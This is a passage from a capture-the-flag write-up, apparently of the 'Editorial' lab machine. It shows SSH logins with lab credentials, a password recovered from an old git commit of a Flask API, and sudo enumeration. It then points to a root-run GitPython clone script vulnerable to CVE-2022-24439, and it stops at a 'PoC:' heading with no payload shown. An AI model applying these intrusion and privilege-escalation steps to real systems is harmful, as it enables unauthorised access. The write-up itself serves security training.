</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_2&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;editorial&#34;</span>: <span style="color:#f1fa8c">&#34;Ed Tiempo Arriba&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;1.2&#34;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_1&#34;</span>: <span style="color:#f1fa8c">&#34;soporte@tiempoarriba.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_2&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;editorial&#34;</span>: <span style="color:#f1fa8c">&#34;Editorial Tiempo Arriba&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/v1.2/metadata/&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;2&#34;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.moc.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;editorial&#34;</span>: <span style="color:#f1fa8c">&#34;Editorial Tiempo Arriba&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/v2/metadata/&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></div><p><strong>coupons</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;2anniversaryTWOandFOURread4&#34;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_2&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;valid_until&#34;</span>: <span style="color:#f1fa8c">&#34;12/02/2024&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;frEsh11bookS230&#34;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_2&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;valid_until&#34;</span>: <span style="color:#f1fa8c">&#34;31/11/2023&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></div><h3 id="foothold">Foothold</h3>
<p>I used the credential from the authors to try to SSH into the box and it worked.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>dev:dev080217_devAPI!@
</span></span></code></pre></div><p><img src="images/20240618083237.png" alt="alt text"></p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>After, successfully getting <code>dev</code>&rsquo;s SSH shell. Let&rsquo;s enumerate the target using LinPEAS.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span>I found a vulnerable version of <span style="color:#ff79c6">`</span>screen v4.<span style="color:#bd93f9">09</span>.<span style="color:#bd93f9">00</span><span style="color:#ff79c6">`</span> but the [exploit](https:<span style="color:#ff79c6">//</span>www.exploit<span style="color:#ff79c6">-</span>db.com<span style="color:#ff79c6">/</span>exploits<span style="color:#ff79c6">/</span><span style="color:#bd93f9">51252</span>) didn<span style="color:#f1fa8c">&#39;t work. To exploit this we needed the `screen` to have setuid bit set by root.
</span></span></span></code></pre></div><p><strong>Users that exist on the box.</strong>
<img src="images/20240618180158.png" alt="alt text"></p>
<p><strong>Found a git initialized directory.</strong>
<img src="images/20240618174809.png" alt="alt text"></p>
<p>After enumerating the <code>apps</code> folder with <code>git</code> I found some interesting commits.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git log
</span></span><span style="display:flex;"><span>commit 8ad0f3187e2bda88bba85074635ea942974587e8 <span style="color:#ff79c6">(</span>HEAD -&gt; master<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
</span></span><span style="display:flex;"><span>Date:   Sun Apr <span style="color:#bd93f9">30</span> 21:04:21 <span style="color:#bd93f9">2023</span> -0500
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    fix: bugfix in api port endpoint
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>commit dfef9f20e57d730b7d71967582035925d57ad883
</span></span><span style="display:flex;"><span>Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
</span></span><span style="display:flex;"><span>Date:   Sun Apr <span style="color:#bd93f9">30</span> 21:01:11 <span style="color:#bd93f9">2023</span> -0500
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    change: remove debug and update api port
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
</span></span><span style="display:flex;"><span>Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
</span></span><span style="display:flex;"><span>Date:   Sun Apr <span style="color:#bd93f9">30</span> 20:55:08 <span style="color:#bd93f9">2023</span> -0500
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    change<span style="color:#ff79c6">(</span>api<span style="color:#ff79c6">)</span>: downgrading prod to dev
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    * To use development environment.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>commit 1e84a036b2f33c59e2390730699a488c65643d28
</span></span><span style="display:flex;"><span>Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
</span></span><span style="display:flex;"><span>Date:   Sun Apr <span style="color:#bd93f9">30</span> 20:51:10 <span style="color:#bd93f9">2023</span> -0500
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    feat: create api to editorial info
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    * It <span style="color:#ff79c6">(</span>will<span style="color:#ff79c6">)</span> contains internal info about the editorial, this <span style="color:#8be9fd;font-style:italic">enable</span>
</span></span><span style="display:flex;"><span>       faster access to information.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
</span></span><span style="display:flex;"><span>Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
</span></span><span style="display:flex;"><span>Date:   Sun Apr <span style="color:#bd93f9">30</span> 20:48:43 <span style="color:#bd93f9">2023</span> -0500
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    feat: create editorial app
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    * This contains the base of this project.
</span></span><span style="display:flex;"><span>    * Also we add a feature to <span style="color:#8be9fd;font-style:italic">enable</span> to external authors send us their
</span></span><span style="display:flex;"><span>       books and validate a future post in our editorial.
</span></span></code></pre></div><p>The commit before <code>change(api): downgrading prod to dev</code> looks very interesting, It says <code>It (will) contains internal info about the editorial, this enable faster access to information.</code> Let&rsquo;s checkout the commit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev@editorial:~/apps$ git checkout 1e84a036b2f33c59e2390730699a488c65643d28
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.min.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.min.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.rtl.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.rtl.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.rtl.min.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.rtl.min.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.min.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.min.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.rtl.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.rtl.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.rtl.min.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.rtl.min.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.min.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.min.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.rtl.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.rtl.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.rtl.min.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.rtl.min.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.min.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.min.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.rtl.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.rtl.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.rtl.min.css
</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.rtl.min.css.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/images/login-background.jpg
</span></span><span style="display:flex;"><span>D	app_editorial/static/images/pexels-janko-ferlic-590493.jpg
</span></span><span style="display:flex;"><span>D	app_editorial/static/images/pexels-min-an-694740.jpg
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.bundle.js
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.bundle.js.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.bundle.min.js
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.bundle.min.js.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.esm.js
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.esm.js.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.esm.min.js
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.esm.min.js.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.js
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.js.map
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.min.js
</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.min.js.map
</span></span><span style="display:flex;"><span>D	app_editorial/templates/about.html
</span></span><span style="display:flex;"><span>D	app_editorial/templates/index.html
</span></span><span style="display:flex;"><span>D	app_editorial/templates/upload.html
</span></span><span style="display:flex;"><span>Note: switching to <span style="color:#f1fa8c">&#39;1e84a036b2f33c59e2390730699a488c65643d28&#39;</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>You are in <span style="color:#f1fa8c">&#39;detached HEAD&#39;</span> state. You can look around, make experimental
</span></span><span style="display:flex;"><span>changes and commit them, and you can discard any commits you make in this
</span></span><span style="display:flex;"><span>state without impacting any branches by switching back to a branch.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>If you want to create a new branch to retain commits you create, you may
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">do</span> so <span style="color:#ff79c6">(</span>now or later<span style="color:#ff79c6">)</span> by using -c with the switch command. Example:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  git switch -c &lt;new-branch-name&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Or undo this operation with:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  git switch -
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Turn off this advice by setting config variable advice.detachedHead to <span style="color:#8be9fd;font-style:italic">false</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HEAD is now at 1e84a03 feat: create api to editorial info
</span></span></code></pre></div><p>After, checking out that commit I found two folders <code>app_api</code> and <code>app_editorial</code>. The <code>app_api</code> was the app that leaked the credential for <code>dev</code> user and gave us foothold.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev@editorial:~/apps$ ls
</span></span><span style="display:flex;"><span>app_api  app_editorial
</span></span><span style="display:flex;"><span>dev@editorial:~/apps$ <span style="color:#8be9fd;font-style:italic">cd</span> app_
</span></span><span style="display:flex;"><span>-bash: cd: app_: No such file or directory
</span></span><span style="display:flex;"><span>dev@editorial:~/apps$ <span style="color:#8be9fd;font-style:italic">cd</span> app_api/
</span></span><span style="display:flex;"><span>dev@editorial:~/apps/app_api$ ls
</span></span><span style="display:flex;"><span>app.py
</span></span></code></pre></div><p>Let&rsquo;s see what&rsquo;s inside the <code>app.py</code> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev@editorial:~/apps/app_api$ cat app.py 
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># API (in development).</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># * To retrieve info about editorial</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>import json
</span></span><span style="display:flex;"><span>from flask import Flask, jsonify
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># App configuration</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">app</span> <span style="color:#ff79c6">=</span> Flask<span style="color:#ff79c6">(</span>__name__<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Global Variables</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">api_route</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/api/latest/metadata&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">api_editorial_name</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Editorial Tiempo Arriba&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">api_editorial_email</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;info@tiempoarriba.htb&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># API routes</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -- : home</span>
</span></span><span style="display:flex;"><span>@app.route<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;/api&#39;</span>, <span style="color:#8be9fd;font-style:italic">methods</span><span style="color:#ff79c6">=[</span><span style="color:#f1fa8c">&#39;GET&#39;</span><span style="color:#ff79c6">])</span>
</span></span><span style="display:flex;"><span>def index<span style="color:#ff79c6">()</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">data_editorial</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;version&#39;</span>: <span style="color:#ff79c6">[{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;1&#39;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;editorial&#39;</span>: <span style="color:#f1fa8c">&#39;Editorial El Tiempo Por Arriba&#39;</span>, 
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_1&#39;</span>: <span style="color:#f1fa8c">&#39;soporte@tiempoarriba.oc&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_2&#39;</span>: <span style="color:#f1fa8c">&#39;info@tiempoarriba.oc&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;api_route&#39;</span>: <span style="color:#f1fa8c">&#39;/api/v1/metadata/&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}}</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;1.1&#39;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;editorial&#39;</span>: <span style="color:#f1fa8c">&#39;Ed Tiempo Arriba&#39;</span>, 
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_1&#39;</span>: <span style="color:#f1fa8c">&#39;soporte@tiempoarriba.oc&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_2&#39;</span>: <span style="color:#f1fa8c">&#39;info@tiempoarriba.oc&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;api_route&#39;</span>: <span style="color:#f1fa8c">&#39;/api/v1.1/metadata/&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}}</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;1.2&#39;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;editorial&#39;</span>: api_editorial_name, 
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_1&#39;</span>: <span style="color:#f1fa8c">&#39;soporte@tiempoarriba.oc&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_2&#39;</span>: <span style="color:#f1fa8c">&#39;info@tiempoarriba.oc&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;api_route&#39;</span>: f<span style="color:#f1fa8c">&#39;/api/v1.2/metadata/&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}}</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;2&#39;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;editorial&#39;</span>: api_editorial_name, 
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email&#39;</span>: <span style="color:#f1fa8c">&#39;info@tiempoarriba.moc.oc&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;api_route&#39;</span>: f<span style="color:#f1fa8c">&#39;/api/v2/metadata/&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}}</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;2.3&#39;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;editorial&#39;</span>: api_editorial_name, 
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email&#39;</span>: api_editorial_email,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;api_route&#39;</span>: f<span style="color:#f1fa8c">&#39;{api_route}/&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> jsonify<span style="color:#ff79c6">(</span>data_editorial<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -- : (development) mail message to new authors</span>
</span></span><span style="display:flex;"><span>@app.route<span style="color:#ff79c6">(</span>api_route + <span style="color:#f1fa8c">&#39;/authors/message&#39;</span>, <span style="color:#8be9fd;font-style:italic">methods</span><span style="color:#ff79c6">=[</span><span style="color:#f1fa8c">&#39;GET&#39;</span><span style="color:#ff79c6">])</span>
</span></span><span style="display:flex;"><span>def api_mail_new_authors<span style="color:#ff79c6">()</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> jsonify<span style="color:#ff79c6">({</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;template_mail_message&#39;</span>: <span style="color:#f1fa8c">&#34;Welcome to the team! We are thrilled to have you on board and can&#39;t wait to see the incredible content you&#39;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#39;t hesitate to reach out if you have any questions or ideas - we&#39;re always here to support you.\n\nBest regards, &#34;</span> + api_editorial_name + <span style="color:#f1fa8c">&#34; Team.&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">})</span> <span style="color:#6272a4"># TODO: replace dev credentials when checks pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Start program</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">__name__</span> <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    app.run<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">host</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>, <span style="color:#8be9fd;font-style:italic">port</span><span style="color:#ff79c6">=</span>5001, <span style="color:#8be9fd;font-style:italic">debug</span><span style="color:#ff79c6">=</span>True<span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>Looks like the we credentials for <code>prod</code> user. Let&rsquo;s try to SSH into the box as <code>prod</code> with the following credential.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>prod:080217_Producti0n_2023!@
</span></span></code></pre></div><p>Successfully logged in as <code>prod</code>.
<img src="images/20240618181004.png" alt="alt text"></p>
<p>The user <code>prod</code> can run only the following script as sudo.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:~$ sudo -l
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>sudo<span style="color:#ff79c6">]</span> password <span style="color:#ff79c6">for</span> prod: 
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff79c6">for</span> prod on editorial:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin,
</span></span><span style="display:flex;"><span>    use_pty
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User prod may run the following commands on editorial:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
</span></span></code></pre></div><p>Let&rsquo;s see what the script looks like.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
</span></span><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>import os
</span></span><span style="display:flex;"><span>import sys
</span></span><span style="display:flex;"><span>from git import Repo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>os.chdir<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;/opt/internal_apps/clone_changes&#39;</span><span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">url_to_clone</span> <span style="color:#ff79c6">=</span> sys.argv<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">r</span> <span style="color:#ff79c6">=</span> Repo.init<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#8be9fd;font-style:italic">bare</span><span style="color:#ff79c6">=</span>True<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>r.clone_from<span style="color:#ff79c6">(</span>url_to_clone, <span style="color:#f1fa8c">&#39;new_changes&#39;</span>, <span style="color:#8be9fd;font-style:italic">multi_options</span><span style="color:#ff79c6">=[</span><span style="color:#f1fa8c">&#34;-c protocol.ext.allow=always&#34;</span><span style="color:#ff79c6">])</span>
</span></span></code></pre></div><p>The script is cloning a repository from a remote URL. And it&rsquo;s using a git library. Let&rsquo;s see which python package is that.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:~$ pip3 list | grep -i git
</span></span><span style="display:flex;"><span>gitdb                 4.0.10
</span></span><span style="display:flex;"><span>GitPython             3.1.29
</span></span></code></pre></div><p><a href="https://www.cve.org/CVERecord?id=CVE-2022-24439"><strong>CVE-2022-24439</strong></a>
According to <a href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858">SNYK</a>: Affected versions( &lt; 3.1.30) of <code>gitpython</code> package are vulnerable to Remote Code Execution (RCE) due to improper user input validation, which makes it possible to inject a maliciously crafted remote URL into the clone command. Exploiting this vulnerability is possible because the library makes external calls to <code>git</code> without sufficient sanitization of input arguments. This is only relevant when enabling the <code>ext</code> transport protocol.</p>
<p><strong>PoC:</strong></p>
